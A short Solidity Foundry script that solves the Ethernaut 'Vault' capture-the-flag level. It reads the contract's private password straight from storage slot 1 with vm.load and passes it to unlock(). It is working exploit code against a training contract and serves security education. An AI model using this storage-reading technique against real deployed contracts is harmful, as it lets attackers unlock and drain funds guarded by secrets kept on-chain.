// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {Vault} from "ethernaut/levels/Vault.sol";

contract Check is CheckScript("VAULT") {}

contract Solve is SolveScript("VAULT") {
    Vault target;

    constructor() {
        target = Vault(instance);
    }

    function attack() public override {
        bytes32 password = vm.load(address(target), bytes32(uint256(1)));
        target.unlock(password);
    }
}
